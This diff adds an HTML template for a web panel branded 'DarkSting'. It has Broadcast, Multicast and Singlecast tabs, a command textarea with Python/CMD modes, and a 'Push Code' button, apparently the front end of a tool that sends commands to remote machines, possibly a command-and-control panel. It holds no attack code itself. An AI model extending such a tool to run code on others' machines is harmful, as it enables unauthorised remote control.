@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="../static/style.css">
+    <script src="../static/script.js"></script>
+    <title>Replit Project</title>
+    <style>
+    </style>
+</head>
+
+<body>
+    <nav class="nav">
+        <img class="image" src="../static/icon.png">
+        <div class="logo">DarkSting</div>
+        <ul class="linkList">
+            <li class="linkItem"><a href="/" class="link active">Broadcast</a></li>
+            <li class="linkItem"><a class="link">Multicast</a></li>
+            <li class="linkItem"><a class="link">Singlecast</a></li>
+        </ul>
+    </nav>
+
+    <div id="codeWindow" class="codeWindow">
+    </div>
+
+    <div class="container">
+        <div class="bottom">
+            <textarea id="codeBox" placeholder="Type your commands here..."></textarea>
+        </div>
+        <div class="switchMenu">
+            <div class="switch">
+                <label class="label">
+                    <input id="python" type="radio" name="mode" value="1" checked> Python
+                </label>
+                <label class="label">
+                    <input id="cmd" type="radio" name="mode" value="0"> CMD
+                </label>
+            </div>
+            <div class="checkbox">
+                <label>
+                    <input type="checkbox" id="repeat"> Repeat Command
+                </label>
+            </div>
+            <button id="runButton" onclick="sendTask()">Push Code</button>
+        </div>
+    </div>
+</body>
+
+</html>
